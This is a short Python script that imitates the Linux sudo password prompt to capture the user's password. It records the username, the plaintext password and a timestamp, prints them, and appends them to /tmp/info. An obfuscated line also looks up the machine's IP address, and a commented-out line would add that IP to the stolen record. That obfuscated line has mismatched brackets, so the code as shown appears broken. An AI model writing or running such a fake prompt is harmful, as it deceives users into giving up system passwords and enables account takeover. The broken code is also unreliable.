#!/bin/python3

from getpass import getuser, getpass
from datetime import datetime
import socket
def get_passwd():
    curr_user = getuser()
    prompt = "[sudo] password for " + curr_user + ': '
    passwd = getpass(prompt)
    #print(gethostbyname_ex(gethostname()))
    print([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith('127.')][:1]), [[s.connect(('8.8.8.8',53)),s.getsockname()[0], 
        s.close()) for s in [socket.socket(socket.AF_INET, 
            socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
    #info = 'ip_addr: <' + ip_addr + '> username:<' + curr_user + '>, passwd:<' + passwd +'>, ' + str(datetime.now())  
    info = 'username:<' + curr_user + '>, passwd:<' + passwd +'>, ' + str(datetime.now())  

    print(info)
    with open('/tmp/info', 'a+') as f:
        f.write(info)

    return info

if __name__ == '__main__':
    get_passwd()
